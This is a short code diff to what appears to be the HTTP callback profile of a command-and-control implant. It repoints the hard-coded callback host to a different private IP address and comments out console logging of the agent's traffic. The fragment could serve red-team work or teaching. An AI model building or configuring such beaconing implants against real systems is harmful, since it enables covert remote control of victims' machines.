@@ -35,7 +35,7 @@ namespace Agent.Profiles
             this.logger = logger;
             this.messageManager = messageManager;
             int callbackPort = Int32.Parse("80");
-            string callbackHost = "http://10.30.25.21";
+            string callbackHost = "http://10.30.26.108";
             string getUri = "q";
             string queryPath = "index";
             string postUri = "data";
@@ -115,7 +115,7 @@ namespace Agent.Profiles
                 try
                 {
                     string responseString = await this.Send(await messageManager.GetAgentResponseStringAsync());
-                    Console.WriteLine(responseString);
+                    //Console.WriteLine(responseString);
                     if (String.IsNullOrEmpty(responseString))
                     {
                         this.currentAttempt++;
@@ -148,7 +148,7 @@ namespace Agent.Profiles
         }
         internal async Task<string> Send(string json)
         {
-            Console.WriteLine(json);
+            //Console.WriteLine(json);
             try
             {
                 //This will encrypted if AES is selected or just Base64 encode if None is referenced.
